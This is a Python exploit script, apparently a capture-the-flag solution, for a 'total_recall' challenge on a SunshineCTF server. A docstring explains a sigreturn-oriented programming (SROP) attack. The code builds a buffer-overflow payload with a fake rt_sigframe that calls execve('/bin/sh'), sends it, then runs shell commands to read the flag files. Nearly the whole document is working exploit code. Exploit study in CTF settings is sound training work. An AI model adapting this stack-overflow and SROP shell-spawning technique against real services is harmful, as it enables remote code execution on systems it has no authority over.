#!/usr/bin/env python3
"""total_recall - SROP.

.text is only 108 bytes and has no libc, so the whole toolbox is:

    401000  call f1 ; call f2 ; mov rax,60 ; xor rdi,rdi ; syscall     # exit(0)
    401016  push rsp ; mov rsi,rsp ; mov rdi,1 ; mov rdx,8 ; mov rax,1 ; syscall
    401031  pop rax
    401032  lea rsi,[rsp-0x40] ; mov rdi,0 ; mov rdx,0x18 ; mov rax,0 ; syscall ; ret
    40104f  lea rsi,[rsp-0x80] ; mov rdi,0 ; mov rdx,0x400 ; mov rax,0 ; syscall ; ret
    40104c  syscall ; ret          <- bare: rax survives
    401069  syscall ; ret          <- bare: rax survives

f2's read overflows 1024 bytes over the saved return address at buf+0x80.  The
stack is not executable (jumps into the buffer die instantly), so the way out is
sigreturn: enter 0x401032 so the 24-byte read leaves rax = <bytes actually read>,
then enter the bare syscall with that rax.  Sending exactly 15 bytes therefore
turns the next syscall into rt_sigreturn, which reloads every register from a
fake frame at the current rsp - total recall.

Layout inside the 1024-byte read buffer, all offsets from buf:

    0x080  G1 = 0x401032   (lea rsi,[rsp-0x40] -> buf+0x48, read 24, ret)
    0x088  SC = 0x401069   (bare syscall; ret)
    0x090  fake rt_sigframe
    0x2A0  "/bin/sh"
    0x2A8  argv = { &"/bin/sh", NULL }
    0x3C0  rsp for the restored context: holds 0x401000 so a *failed* execve
           restarts the program and leaks again instead of dying silently.

The kernel disagrees about where rsp points (whole rt_sigframe with a 128-byte
siginfo prefix, or straight at the ucontext).  The mcontext sits at frame+0xA8
in the first case and frame+0x28 in the second, and the two windows only share
slots the kernel does not care about, so both frames are written at once.

f1's leak is `push rsp`, and PUSH with RSP as source stores the *decremented*
pointer, which makes buf = L-0x78.  Every address observable through that leak
carries the same +-8 ambiguity, so the delta is a parameter.
"""
import re
import socket
import struct
import sys
import time

HOST = "chal.sunshinectf.games"
PORT = 26003

EXIT0 = 0x401000
G1 = 0x401032           # lea rsi,[rsp-0x40]; rdi=0; rdx=0x18; rax=0; syscall; ret
SC = 0x401069           # syscall; ret, entered directly so rax is untouched

OFF_FRAME = 0x90
OFF_STR = 0x2A0
OFF_ARGV = 0x2A8
OFF_RET = 0x3C0
FRAME_LEN = 0x170
MC_BASES = (0xA8, 0x28)  # &sigcontext for both rt_sigframe interpretations

# struct sigcontext field table, offsets from the start of the sigcontext
SC_R8, SC_RDI, SC_RSI, SC_RBP, SC_RBX, SC_RDX, SC_RAX, SC_RCX = (
    0x00, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70)
SC_RSP, SC_RIP, SC_EFLAGS, SC_SELECTORS = 0x78, 0x80, 0x88, 0x90
SC_OLDMASK, SC_FPSTATE = 0xA8, 0xB0


def p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def build_frame(buf):
    """A byte region that is a valid sigframe under both base conventions."""
    f = bytearray(FRAME_LEN)
    want = {
        SC_RDI: buf + OFF_STR,
        SC_RSI: buf + OFF_ARGV,
        SC_RDX: 0,
        SC_RAX: 59,                       # execve
        SC_RSP: buf + OFF_RET,
        SC_RIP: SC,                       # the bare syscall; ret
        SC_EFLAGS: 0x246,
        SC_SELECTORS: 0x33 | (0x2B << 48),  # cs=0x33, gs=0, fs=0, ss=0x2b
        SC_OLDMASK: 0,
        SC_FPSTATE: 0,
    }
    # Write the far window (base 0xA8) first so the near window's critical
    # values land on top of slots the far window does not read.
    for base in (0xA8, 0x28):
        for off, val in want.items():
            struct.pack_into("<Q", f, base + off, val & 0xFFFFFFFFFFFFFFFF)
    return bytes(f)


def build_payload(L, delta):
    buf = (L + delta) & 0xFFFFFFFFFFFFFFFF
    pl = bytearray(0x400)
    pl[0x80:0x88] = p64(G1)
    pl[0x88:0x90] = p64(SC)
    pl[OFF_FRAME:OFF_FRAME + FRAME_LEN] = build_frame(buf)
    pl[OFF_STR:OFF_STR + 8] = b"/bin/sh\x00"
    pl[OFF_ARGV:OFF_ARGV + 8] = p64(buf + OFF_STR)
    pl[OFF_ARGV + 8:OFF_ARGV + 16] = p64(0)
    pl[OFF_RET:OFF_RET + 8] = p64(EXIT0)
    return buf, bytes(pl[:OFF_RET + 8])


def recvn(s, n, timeout=6.0):
    s.settimeout(timeout)
    out = b""
    while len(out) < n:
        try:
            c = s.recv(n - len(out))
        except socket.timeout:
            break
        if not c:
            break
        out += c
    return out


def recv_some(s, timeout):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    return out


def run(delta, cmds, verbose=True):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        leak = recvn(s, 8)
        if len(leak) != 8:
            print("[-] short leak %r" % leak)
            return None
        L = struct.unpack("<Q", leak)[0]
        buf, pl = build_payload(L, delta)
        if verbose:
            print("[+] L=%#x buf=%#x frame=%#x" % (L, buf, buf + OFF_FRAME))
        s.sendall(b"\x90" * 24 + pl)
        time.sleep(0.6)
        s.sendall(b"B" * 15)              # rax = 15 = rt_sigreturn
        time.sleep(0.6)
        first = recv_some(s, 2.0)
        if len(first) == 8:
            print("[!] execve failed: the program restarted and leaked again")
            return None
        s.sendall(b"".join((c + "\n").encode() for c in cmds))
        out = recv_some(s, 5.0)
        sys.stdout.write(out.decode("utf-8", "replace"))
        return out
    finally:
        s.close()


CMDS = ["ls /", "cat /flag /flag.txt /flag* 2>/dev/null", "id"]

if __name__ == "__main__":
    delta = int(sys.argv[1], 0) if len(sys.argv) > 1 else -0x78
    out = run(delta, CMDS)
    if out:
        flags = re.findall(rb"sun\{[^{}\r\n]{1,120}\}", out)
        for f in flags:
            print("[FLAG]", f.decode())
        if flags:
            open("flag.txt", "wb").write(flags[0] + b"\n")
